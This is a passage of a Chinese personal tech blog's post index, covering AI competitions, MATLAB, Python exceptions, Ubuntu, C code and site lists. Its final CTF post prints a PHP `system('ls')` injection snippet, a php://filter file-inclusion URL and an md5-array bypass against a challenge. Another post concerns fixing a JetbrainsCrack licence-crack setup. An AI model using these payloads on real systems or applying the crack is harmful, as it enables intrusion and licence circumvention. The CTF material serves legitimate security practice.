title="其他公司比赛"></a>其他公司比赛</h1><p>以上都是大家可能比较熟知的比赛平台，但也有一些公司自己举办的非常好的AI比赛平台。<br>京东大赛：<a href="http://jddjr.jd.com/" target="_blank" rel="noopener">http://jddjr.jd.com/</a><br>CSDN- tinymind比赛：<a href="https://www.tinymind.cn/competitions" target="_blank" rel="noopener">https://www.tinymind.cn/competitions</a><br>baidu点石： <a href="http://dianshi.baidu.com/gemstone/home" target="_blank" rel="noopener">http://dianshi.baidu.com/gemstone/home</a><br>AI开发者大赛 - 讯飞开放平台：<a href="http://challenge.xfyun.cn/" target="_blank" rel="noopener">http://challenge.xfyun.cn/</a><br>腾讯云竞赛平台：<a href="https://cloud.tencent.com/developer/contests" target="_blank" rel="noopener">https://cloud.tencent.com/developer/contests</a><br>爱奇艺AI竞赛平台：<a href="http://challenge.ai.iqiyi.com/" target="_blank" rel="noopener">http://challenge.ai.iqiyi.com/</a><br>ATEC蚂蚁开发者大会： <a href="https://dc.cloud.alipay.com/index#/home" target="_blank" rel="noopener">https://dc.cloud.alipay.com/index#/home</a><br>泰迪杯-泰迪公司：<a href="http://www.tipdm.org/bdrace/jingsa/" target="_blank" rel="noopener">http://www.tipdm.org/bdrace/jingsa/</a><br>竞技乎–最近没什么动静</p><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h1><p>•    珠算，它提供了一个Python编程库，能够便捷地实现贝叶斯深度学习的建模和推理。<br>Studys<br>•    比xgboost强大的LightGBM:调参指南(带贝叶斯优化代码) - CSDN博客<br>•    主流机器学习模型模板代码+经验分享[xgb, lgb, Keras, LR]<br>深度学习中经常看到epoch、iteration和batchsize，下面按照自己的理解说说这三个区别：<br>（1）batchsize：批大小。在深度学习中，一般采用SGD训练，即每次训练在训练集中取batchsize个样本训练；<br>（2）iteration：1个iteration等于使用batchsize个样本训练一次；<br>（3）epoch：1个epoch等于使用训练集中的全部样本训练一次；<br>举个例子，训练集有1000个样本，batchsize=10，那么： 训练完整个样本集需要： 100次iteration，1次epoch。<br>AI_competitions_code<br>马上消费金融挑战者大赛-违约用户风险预测–第三名方案:chizhu/AI_Risk<br>第一届腾讯社交广告高校算法大赛(全国14名): freelzy / Tencent_Social_Ads<br>2017-CCF-BDCI-让AI当法官(初赛):ShawnyXiao/2017-CCF-BDCI-AIJudge<br>初赛Rank1 复赛Rank1 2018 CCF 大数据与计算智能大赛 供应链需求预测：yuxiaowww/BDCI-2018-Supply-Chain-Demand-Forecast<br>招商银行信用卡中心 消费金融场景下的用户购买预测 rank1: sunwantong/China-Merchants-Bank-credit-card-Cente-User-purchase-forecast</p>]]></content>
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>matlab使用sym出现警告提示</title>
      <link href="/2019/03-13-matlab-qus1.html"/>
      <url>/2019/03-13-matlab-qus1.html</url>
      <content type="html"><![CDATA[<p>　　matlab使用sym时出现：”警告: Support of strings that are not valid variable names or define a number will be removed in a future release. To create symbolic expressions, first create symbolic variables and then use operations on them. “<br>在MATLAB中，sym函数用于创建符号数字、符号变量、符号对象。符号对象的类型是sym，可以通过class(S)来验证，这里S是一个符号对象。符号变量的优点是，使用符号变量运算得到的只是一个解析解，即sym将非符号对象（如，数字，表达式，变量等）A转换为符号对象，并存储在符号变量S中。。<br>　　例如，在符号变量运算过程中pi就用pi表示，而不是具体的近似数值3.14或3.14159。使用符号变量进行运算能最大限度减少运算过程中因舍入造成的误差。符号变量也便于进行运算过程的演示。<br>　　语法格式：<br>　　S = sym(A)将非符号对象（如，数字，表达式，变量等）A转换为符号对象，并存储在符号变量S中。<br>但是在2017b版本后：As of R2017b, Mathworks added str2sym() to convert character vectors to symbolic expressions. The expressions need to be in MATLAB syntax – the sym() version expected the expressions to be in MuPAD syntax (which might be why they want to get rid of it.)<br>意思是不支持无效变量名或定义数字的字符串转换，这将在将来的版本中删除。<br>较为通行的做法是，先定义符号变量，然后对符号表达式求解：<br>例如：<br>将</p><blockquote><p>syms t;<br>f=sym(‘(2-exp(-2<em>t))</em>heaviside(t)’);<br>ezplot(f,[-1,10])</p></blockquote><p>改为：</p><blockquote><p>syms t;<br>f=sym((2-exp(-2<em>t))</em>heaviside(t));<br>ezplot(f,[-1,10])</p></blockquote><p>或者去掉sym用法</p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python3异常处理和断言assert使用小结</title>
      <link href="/2019/01-18-python-error-resolve.html"/>
      <url>/2019/01-18-python-error-resolve.html</url>
      <content type="html"><![CDATA[<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    # 代码逻辑,只要其中任意一行报错都会被捕捉</span><br><span class="line">    i = int(&apos;aaa&apos;)</span><br><span class="line">    print(i)</span><br><span class="line">except Exception as e:  # 如果出错执行</span><br><span class="line">    # 捕捉错误</span><br><span class="line">    print(e)  # invalid literal for int() with base 10: &apos;aaa&apos;</span><br><span class="line">else:</span><br><span class="line">    print(&apos;no Error&apos;)  # 当没有错误的时候才执行</span><br><span class="line">finally:  # 不管出不出错一定会执行</span><br><span class="line">    print(&apos;over&apos;)</span><br></pre></td></tr></table></figure><p>这里的Exception是一个包容所有错误的类，当然也可以写一些分类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    s = &apos;aaa&apos;</span><br><span class="line">    print(s[5])</span><br><span class="line">except IndexError as e:</span><br><span class="line">    print(e)  # string index out of range</span><br><span class="line">except IOError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>另外一种写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    s = aaa</span><br><span class="line">    print(s[5])</span><br><span class="line">except (IndexError, NameError) as e:</span><br><span class="line">    print(e)  # name &apos;aaa&apos; is not defined</span><br></pre></td></tr></table></figure><h1 id="主动触发异常"><a href="#主动触发异常" class="headerlink" title="主动触发异常"></a>主动触发异常</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    raise Exception(&apos;自首&apos;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)  # 自首</span><br></pre></td></tr></table></figure><h1 id="自定义主动触发错误"><a href="#自定义主动触发错误" class="headerlink" title="自定义主动触发错误"></a>自定义主动触发错误</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class MyError(Exception):</span><br><span class="line">    def __init__(self, msg):</span><br><span class="line">        self.message = msg</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.message</span><br><span class="line">try:</span><br><span class="line">    raise MyError(&apos;我错了&apos;)</span><br><span class="line">except MyError as e:</span><br><span class="line">    print(e)  # 我错了</span><br></pre></td></tr></table></figure><h1 id="assert-断言"><a href="#assert-断言" class="headerlink" title="assert 断言"></a>assert 断言</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(123)</span><br><span class="line">assert 1 == 1  # assert 条件，满足就执行下去，不满足报错</span><br><span class="line">print(456)</span><br><span class="line">print(123)</span><br><span class="line">assert False  # AssertionError</span><br><span class="line">print(456)</span><br></pre></td></tr></table></figure><hr><p>作者：Tyran_U<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/tyrantu1989/article/details/78521298" target="_blank" rel="noopener">https://blog.csdn.net/tyrantu1989/article/details/78521298</a></p>]]></content>
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ubuntu下技巧总结</title>
      <link href="/2018/11-27-ubuntu-skills.html"/>
      <url>/2018/11-27-ubuntu-skills.html</url>
      <content type="html"><![CDATA[<h1 id="双系统在开机选项时设定为上一次选择的系统"><a href="#双系统在开机选项时设定为上一次选择的系统" class="headerlink" title="双系统在开机选项时设定为上一次选择的系统"></a>双系统在开机选项时设定为上一次选择的系统</h1><p>1.在终端内输入sudo gedit /etc/default/grub<br>2.添加 GRUB_SAVEDEFAULT=true 字段（保存上一次启动项）<br>3.修改GRUB_DEFAULT=0为GRUB_DEFAULT=saved（设置默认启动项为保存的上一次启动项）<br>4.sudo update-grub</p><h1 id="linux下锐捷客户端相关命令设定"><a href="#linux下锐捷客户端相关命令设定" class="headerlink" title="linux下锐捷客户端相关命令设定"></a>linux下锐捷客户端相关命令设定</h1><p>锐捷安装包地址：<a href="https://pan.lanzou.com/i0uanwf" target="_blank" rel="noopener">https://pan.lanzou.com/i0uanwf</a><br>解压后，执行.sh文件<br>sudo ./rjsupplicant.sh –help查看帮助（readme有结构说明）<br>sudo ./rjsupplicant.sh -s 联通|移动|电信 -u 用户名 -p 密码 -d 0<br>登陆后，network-manager自动关闭<br>利用：sudo service network-manager start重新开启<br>设定DNS:sudo vim /etc/resolve.conf</p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>根据输入的图的邻接矩阵A，判断此图的连通分量的个数</title>
      <link href="/2018/10-24-cprogram1.html"/>
      <url>/2018/10-24-cprogram1.html</url>
      <content type="html"><![CDATA[<h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>输入：第一行为图的结点数n，然后n行是无向图的邻接矩阵<br>输出：连通分量的个数<br>【样例输入】<br>5<br>0 1 1 0 0<br>1 0 1 0 0<br>1 1 0 0 0<br>0 0 0 0 1<br>0 0 0 1 0<br>【样例输出】<br>2<br>5<br>0 1 0 1 1<br>1 0 1 1 0<br>0 1 0 1 1<br>1 1 1 0 1<br>1 0 1 1 0<br>【样例输出】</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line">int n;</span><br><span class="line">int g[105][105];</span><br><span class="line">int flag[1005];</span><br><span class="line">void dfs(int x)     //将所有与点y连接的点标记，认为在一个连通分量</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span>(flag[i]==0&amp;&amp;g[x][i]==1)</span><br><span class="line">  &#123;</span><br><span class="line">   flag[i]=1;</span><br><span class="line">   dfs(i);     //深度优先遍历，递归处理与点i在同一个连通分支的点</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">void tdfs()</span><br><span class="line">&#123;</span><br><span class="line">  int sum=0;</span><br><span class="line">  int i;</span><br><span class="line">  <span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(flag[i]==0)   //遇到新的连通分支</span><br><span class="line">    &#123;   </span><br><span class="line">      flag[i]=1;  //先标记自身,从下一行开始检索</span><br><span class="line">      dfs(i);</span><br><span class="line">      sum++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"连通分量为:%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char c;</span><br><span class="line">  int i,j;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"输入节点个数:"</span>);</span><br><span class="line">  scanf(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">  <span class="keyword">if</span>(n&gt;100)</span><br><span class="line">  &#123;</span><br><span class="line">    pr  intf(<span class="string">"超出存储范围error!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"输入图的邻接矩阵（0/1表示）:\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">    <span class="keyword">for</span>(j=0;j&lt;n;)</span><br><span class="line">    &#123;</span><br><span class="line">      c=getchar();</span><br><span class="line">      <span class="keyword">if</span> (c==<span class="string">'\n'</span>||c==<span class="string">' '</span>)</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span>(c!=<span class="string">'0'</span>&amp;&amp;c!=<span class="string">'1'</span>)</span><br><span class="line">   &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"邻接矩阵error!\n"</span>);</span><br><span class="line">      <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      g[i][j]=c-<span class="string">'0'</span>;</span><br><span class="line">      j++;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入的图的邻接矩阵为:\n"</span>);  </span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span>(j=0;j&lt;n;j++)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d "</span>,g[i][j]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tdfs();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c language </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安装完Pycharm，启动时碰到&quot;failed to load jvm dll&quot;的解决方案</title>
      <link href="/2018/10-14-pycharm-error.html"/>
      <url>/2018/10-14-pycharm-error.html</url>
      <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>本文针对的是JetbrainsCrack包使用错误问题:<br>注意文件路径双右斜杠或者单左斜杠，正确如下图，一般出现这种错误是破解包jar路径错误或者是版本不对。<br><img src="/article_img/pycharm-solution.png" alt="&quot;pycharm-solution&quot;"></p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pycharm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在线学习网站集合</title>
      <link href="/2018/08-28-online-website.html"/>
      <url>/2018/08-28-online-website.html</url>
      <content type="html"><![CDATA[<h1 id="CSLG"><a href="#CSLG" class="headerlink" title="CSLG"></a>CSLG</h1><h2 id="校园网站"><a href="#校园网站" class="headerlink" title="校园网站"></a>校园网站</h2><h3 id="打卡查询"><a href="#打卡查询" class="headerlink" title="打卡查询"></a>打卡查询</h3><p>账号密码都是学号，已改为校内直接访问校外vpn登录方式。<br><a href="http://10.28.102.51.cslg.vpn358.com/student/" target="_blank" rel="noopener">http://10.28.102.51.cslg.vpn358.com/student/</a></p><h3 id="宿舍IP查询"><a href="#宿舍IP查询" class="headerlink" title="宿舍IP查询"></a>宿舍IP查询</h3><p>DNS可直接写114.114.114.114<br><a href="http://ipcx.info.cslg.edu.cn/wap.asp" target="_blank" rel="noopener">http://ipcx.info.cslg.edu.cn/wap.asp</a></p><h3 id="信息化办公室-win、linux、mac下的锐捷安装包"><a href="#信息化办公室-win、linux、mac下的锐捷安装包" class="headerlink" title="信息化办公室(win、linux、mac下的锐捷安装包)"></a>信息化办公室(win、linux、mac下的锐捷安装包)</h3><p>已改为校内直接访问校外vpn登录方式。<br><a href="http://10.28.200.248.cslg.vpn358.com/?p=1961" target="_blank" rel="noopener">http://10.28.200.248.cslg.vpn358.com/?p=1961</a><br>其中linux下的锐捷程序包不完整</p><h3 id="综测查询网站"><a href="#综测查询网站" class="headerlink" title="综测查询网站"></a>综测查询网站</h3><p><a href="http://xsgz.cslg.edu.cn" target="_blank" rel="noopener">http://xsgz.cslg.edu.cn</a></p><h3 id="校级大学生创新创业训练计划平台网址"><a href="#校级大学生创新创业训练计划平台网址" class="headerlink" title="校级大学生创新创业训练计划平台网址"></a>校级大学生创新创业训练计划平台网址</h3><p><a href="http://sjcx.cslg.cn" target="_blank" rel="noopener">http://sjcx.cslg.cn</a></p><h3 id="省级大学生创新创业训练计划平台网址"><a href="#省级大学生创新创业训练计划平台网址" class="headerlink" title="省级大学生创新创业训练计划平台网址"></a>省级大学生创新创业训练计划平台网址</h3><p><a href="http://jscx.njnu.edu.cn/Index.aspx" target="_blank" rel="noopener">http://jscx.njnu.edu.cn/Index.aspx</a><br><a href="https://jsgjc.jse.edu.cn/cxcy/" target="_blank" rel="noopener">https://jsgjc.jse.edu.cn/cxcy/</a> (新网址)</p><h3 id="国家级大学生创新创业训练计划平台网址"><a href="#国家级大学生创新创业训练计划平台网址" class="headerlink" title="国家级大学生创新创业训练计划平台网址"></a>国家级大学生创新创业训练计划平台网址</h3><p><a href="http://gjcxcy.bjtu.edu.cn/Index.aspx" target="_blank" rel="noopener">http://gjcxcy.bjtu.edu.cn/Index.aspx</a></p><h3 id="全国大学生创业服务网"><a href="#全国大学生创业服务网" class="headerlink" title="全国大学生创业服务网"></a>全国大学生创业服务网</h3><p><a href="https://cy.ncss.cn/" target="_blank" rel="noopener">https://cy.ncss.cn/</a></p><h2 id="大三第一学期"><a href="#大三第一学期" class="headerlink" title="大三第一学期"></a>大三第一学期</h2><h3 id="C-网络通信编程"><a href="#C-网络通信编程" class="headerlink" title="C#网络通信编程"></a>C#网络通信编程</h3><p><a href="http://www.tup.com.cn/booksCenter/book_05907001.html" target="_blank" rel="noopener">http://www.tup.com.cn/booksCenter/book_05907001.html</a></p><h3 id="正保创业实训网"><a href="#正保创业实训网" class="headerlink" title="正保创业实训网"></a>正保创业实训网</h3><p><a href="http://www.chinapen.org.cn/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">http://www.chinapen.org.cn/?tdsourcetag=s_pctim_aiomsg</a></p><h1 id="技术论坛"><a href="#技术论坛" class="headerlink" title="技术论坛"></a>技术论坛</h1><h2 id="红黑联盟论坛"><a href="#红黑联盟论坛" class="headerlink" title="红黑联盟论坛"></a>红黑联盟论坛</h2><p><a href="https://www.2cto.com/" target="_blank" rel="noopener">https://www.2cto.com/</a></p><h1 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h1><h2 id="Atom-介绍和使用方法"><a href="#Atom-介绍和使用方法" class="headerlink" title="Atom - 介绍和使用方法"></a>Atom - 介绍和使用方法</h2><p><a href="https://blog.csdn.net/qq_32340877/article/details/79095610" target="_blank" rel="noopener">https://blog.csdn.net/qq_32340877/article/details/79095610</a></p><h2 id="ScreenToGif"><a href="#ScreenToGif" class="headerlink" title="ScreenToGif"></a>ScreenToGif</h2><p><a href="https://github.com/NickeManarin/ScreenToGif" target="_blank" rel="noopener">https://github.com/NickeManarin/ScreenToGif</a></p><h1 id="资源网站"><a href="#资源网站" class="headerlink" title="资源网站"></a>资源网站</h1><h2 id="公开数据库"><a href="#公开数据库" class="headerlink" title="公开数据库"></a>公开数据库</h2><h3 id="DBPub"><a href="#DBPub" class="headerlink" title="DBPub"></a>DBPub</h3><p><a href="http://dbpub.cnki.net/grid2008/dbpub/index.aspx" target="_blank" rel="noopener">http://dbpub.cnki.net/grid2008/dbpub/index.aspx</a></p><h2 id="Xcode历史版本下载"><a href="#Xcode历史版本下载" class="headerlink" title="Xcode历史版本下载"></a>Xcode历史版本下载</h2><p><a href="https://developer.apple.com/downloads/index.action" target="_blank" rel="noopener">https://developer.apple.com/downloads/index.action</a></p><h2 id="Cordova入门"><a href="#Cordova入门" class="headerlink" title="Cordova入门"></a>Cordova入门</h2><p><a href="https://blog.csdn.net/csdn100861/article/details/78585333" target="_blank" rel="noopener">https://blog.csdn.net/csdn100861/article/details/78585333</a></p><h2 id="中国大学MOOC"><a href="#中国大学MOOC" class="headerlink" title="中国大学MOOC"></a>中国大学MOOC</h2><p><a href="https://www.icourse163.org/university/view/all.htm#/" target="_blank" rel="noopener">https://www.icourse163.org/university/view/all.htm#/</a></p><h2 id="清华大学开源软件镜像站"><a href="#清华大学开源软件镜像站" class="headerlink" title="清华大学开源软件镜像站"></a>清华大学开源软件镜像站</h2><p><a href="https://mirrors.tuna.tsinghua.edu.cn" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn</a></p><h2 id="微软各种镜像资源"><a href="#微软各种镜像资源" class="headerlink" title="微软各种镜像资源"></a>微软各种镜像资源</h2><p><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></p><h1 id="CTF训练网站"><a href="#CTF训练网站" class="headerlink" title="CTF训练网站"></a>CTF训练网站</h1><h2 id="ctfd"><a href="#ctfd" class="headerlink" title="ctfd"></a>ctfd</h2><p><a href="https://ctfd.io/" target="_blank" rel="noopener">https://ctfd.io/</a></p><h2 id="bugku"><a href="#bugku" class="headerlink" title="bugku"></a>bugku</h2><p><a href="https://ctf.bugku.com/" target="_blank" rel="noopener">https://ctf.bugku.com/</a></p><h2 id="实验吧"><a href="#实验吧" class="headerlink" title="实验吧"></a>实验吧</h2><p><a href="http://www.shiyanbar.com/" target="_blank" rel="noopener">http://www.shiyanbar.com/</a></p><h2 id="i春秋"><a href="#i春秋" class="headerlink" title="i春秋"></a>i春秋</h2><p><a href="https://www.ichunqiu.com/" target="_blank" rel="noopener">https://www.ichunqiu.com/</a></p><h2 id="南京邮电大学网络攻防训练平台"><a href="#南京邮电大学网络攻防训练平台" class="headerlink" title="南京邮电大学网络攻防训练平台"></a>南京邮电大学网络攻防训练平台</h2><p><a href="http://ctf.nuptzj.cn/login" target="_blank" rel="noopener">http://ctf.nuptzj.cn/login</a>?</p><h1 id="ACM训练网站"><a href="#ACM训练网站" class="headerlink" title="ACM训练网站"></a>ACM训练网站</h1><h2 id="落谷"><a href="#落谷" class="headerlink" title="落谷"></a>落谷</h2><p><a href="https://www.luogu.org/" target="_blank" rel="noopener">https://www.luogu.org/</a></p><h2 id="蓝桥杯"><a href="#蓝桥杯" class="headerlink" title="蓝桥杯"></a>蓝桥杯</h2><p><a href="http://lx.lanqiao.cn/" target="_blank" rel="noopener">http://lx.lanqiao.cn/</a></p><h1 id="在线环境"><a href="#在线环境" class="headerlink" title="在线环境"></a>在线环境</h1><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p><a href="http://demo.php.cn/" target="_blank" rel="noopener">http://demo.php.cn/</a><br><a href="https://c.runoob.com/compile/1" target="_blank" rel="noopener">https://c.runoob.com/compile/1</a></p>]]></content>
      
      
        <tags>
            
            <tag> online-website </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ctf案例集合</title>
      <link href="/2018/08-27-ctf-case.html"/>
      <url>/2018/08-27-ctf-case.html</url>
      <content type="html"><![CDATA[<h1 id="php文件包含"><a href="#php文件包含" class="headerlink" title="php文件包含"></a>php文件包含</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php <span class="built_in">echo</span> system(<span class="string">'ls'</span>);?&gt;</span><br><span class="line">php文件不可直接读取</span><br><span class="line">http://c10f7a1937b741168cb36c3616b15b2cba8c1914e1224d37.game.ichunqiu.com/?path=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=dle345aae.php</span><br></pre></td></tr></table></figure><h1 id="绕过md5的web爆破"><a href="#绕过md5的web爆破" class="headerlink" title="绕过md5的web爆破"></a>绕过md5的web爆破</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require(<span class="string">'./flag.php'</span>);</span><br><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>] = 0;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'time'</span>] = time();</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'time'</span>]+120  session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_REQUEST</span>[<span class="string">'value'</span>];</span><br><span class="line"><span class="variable">$str_rand</span> = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line"><span class="variable">$str_rands</span> = <span class="variable">$str_rand</span>[mt_rand(0,25)].<span class="variable">$str_rand</span>[mt_rand(0,25)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>]==(<span class="variable">$value</span>[0].<span class="variable">$value</span>[1]) &amp;&amp; substr(md5(<span class="variable">$value</span>),5,4)==0)&#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]++;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">'whoami'</span>] = <span class="variable">$str_rands</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$str_rands</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">'nums'</span>]&gt;=10)&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>只要第一次传进去的value与session中的相等，则网页会输出下一个value值，通过使用md5函数不能对数组进行处理的漏洞来绕过substr(md5($value),5,4)==0的判断，使nums得值大于10即可得到flag<br>使用如下py：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url 